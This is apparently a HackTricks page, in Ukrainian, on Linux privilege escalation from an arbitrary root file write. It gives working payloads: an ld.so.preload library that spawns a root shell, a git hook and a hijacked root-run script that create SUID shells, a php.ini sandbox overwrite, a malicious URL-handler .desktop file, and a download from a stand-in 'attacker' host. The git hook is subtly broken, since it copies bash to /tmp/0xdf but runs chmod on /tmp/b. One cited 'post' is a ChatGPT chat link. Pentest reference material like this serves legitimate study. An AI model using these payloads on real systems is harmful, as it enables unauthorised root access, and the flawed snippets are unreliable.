# Довільний запис файлу у root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Цей файл поводиться подібно до **`LD_PRELOAD`** env variable, але він також працює в **SUID binaries**.\
Якщо ви можете створити його або змінити, ви можете просто додати **шлях до бібліотеки, яка буде завантажена** при кожному виконанні binary.

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) — це **скрипти**, які **виконуються** при різних **подіях** у git репозиторії, наприклад коли створюється commit, merge... Тож якщо **привілейований скрипт або користувач** часто виконує ці дії і є можливість **записувати в папку `.git`**, це можна використати для **privesc**.

Наприклад, можливо **згенерувати скрипт** в git репозиторії в **`.git/hooks`**, щоб він завжди виконувався при створенні нового commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron та часові файли

TODO

### Файли сервісів та сокетів

TODO

### Перезаписати обмежений `php.ini`, що використовується привілейованим PHP sandbox

Деякі кастомні daemon валідовують PHP, переданий користувачем, запускаючи `php` з **обмеженим `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо sandboxed код все ще має **any write primitive** (наприклад, `file_put_contents`) і ви можете дістатися до **exact `php.ini` path**, який використовує daemon, ви можете **overwrite that config**, щоб зняти обмеження, а потім відправити другий payload, який виконуватиметься з elevated privileges.

Типовий потік:

1. Перший payload перезаписує sandbox config.
2. Другий payload виконує код тепер, коли dangerous functions знову enabled.

Мінімальний приклад (замініть шлях, який використовує daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

Зловмисник із правами запису в директоріях конфігурації жертви може легко замінити або створити файли, які змінюють поведінку системи й призводять до небажаного виконання коду. Змінивши файл `$HOME/.config/mimeapps.list`, щоб вказати HTTP та HTTPS URL handlers на шкідливий файл (наприклад, встановивши `x-scheme-handler/http=evil.desktop`), зловмисник забезпечує, що **натискання будь-якого http або https посилання викликає код, вказаний у цьому `evil.desktop` файлі**. Наприклад, після розміщення наступного шкідливого коду в `evil.desktop` у `$HOME/.local/share/applications`, будь-яке зовнішнє натискання URL запускає вбудовану команду:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Для додаткової інформації перегляньте [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), де його використали для експлуатації реальної вразливості.

### Root виконує скрипти/бінарні файли, доступні для запису користувачем

Якщо привілейований робочий процес запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл всередині директорії, що належить непривілейованому користувачу), ви можете його перехопити:

- **Виявлення виконання:** слідкуйте за процесами за допомогою [pspy](https://github.com/DominicBreuker/pspy), щоб виявити, коли root викликає шляхи, контрольовані користувачем:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Підтвердьте можливість запису:** переконайтеся, що і цільовий файл, і його директорія належать вашому обліковому запису і доступні для запису ним.
- **Захопіть ціль:** створіть резервну копію оригінального binary/script і помістіть payload, який створює SUID shell (або будь-яку іншу root-дію), потім відновіть права доступу:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Запустіть привілейовану дію** (наприклад, натискання UI-кнопки, яка запускає helper). Коли root повторно виконає hijacked path, отримайте escalated shell за допомогою `./rootshell -p`.

## Посилання

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
